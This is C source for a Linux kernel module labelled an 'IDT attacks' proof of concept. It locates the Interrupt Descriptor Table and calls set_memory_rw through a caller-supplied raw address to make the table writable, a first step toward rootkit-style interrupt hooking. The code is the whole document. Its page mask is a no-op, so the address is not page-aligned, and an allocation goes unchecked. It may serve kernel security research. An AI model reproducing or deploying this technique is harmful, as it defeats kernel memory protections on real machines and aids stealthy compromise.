#include <linux/module.h>
#include <linux/slab.h>
#include <linux/moduleparam.h>
#include <asm/desc.h>
#include <linux/kernel.h>

MODULE_AUTHOR("Lorenzo Susini");
MODULE_LICENSE("GPL");

static int (*set_memory_rw)(unsigned long addr, int numpages); 
static struct gate_desc *idt;
static char *addr;

module_param(addr, charp, 0000);

static void print_basic_info(void){
    struct desc_ptr *descriptor = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
    store_idt(descriptor);
    printk("IDT attacks PoC started\n");
    printk("IDT address is 0x%lx, size %d", descriptor->address, (int)descriptor->size);
    idt = (struct gate_desc *)descriptor->address;
    kfree(descriptor);
}

static int m1_init(void) {
    unsigned long set_memory_rw_addr;
    int ret;
    print_basic_info();
    printk("Received as param: %s\n", addr);
    ret = kstrtol(addr, 0, &set_memory_rw_addr);
    if(ret < 0)
        return -1;
    printk("Param as int %p", (void *)set_memory_rw_addr);
    set_memory_rw = (int(*)(unsigned long, int))set_memory_rw_addr;
    set_memory_rw((unsigned long)idt & (~0x000), 1);
    return 0;
}

static void m1_exit(void) {
    printk("IDT attacks PoC removed\n");

}

module_init(m1_init);
module_exit(m1_exit);